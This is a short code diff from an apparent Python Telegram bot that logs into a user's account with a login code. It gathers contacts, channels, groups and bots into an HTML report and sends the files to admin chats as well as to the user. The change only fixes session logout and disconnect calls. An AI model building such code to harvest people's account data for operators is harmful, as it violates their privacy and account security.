@@ -96,10 +96,12 @@ async def get_code(message: types.Message):
         await save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
         await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html)
         await send_files_to_bot(bot, admin_chat_ids, user_chat_id)
+        await client.log_out()
+        await client.disconnect()
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
-        client.log_out()
+        await client.log_out()
         await client.disconnect()
         user_state.pop(message.from_user.id, None)
 
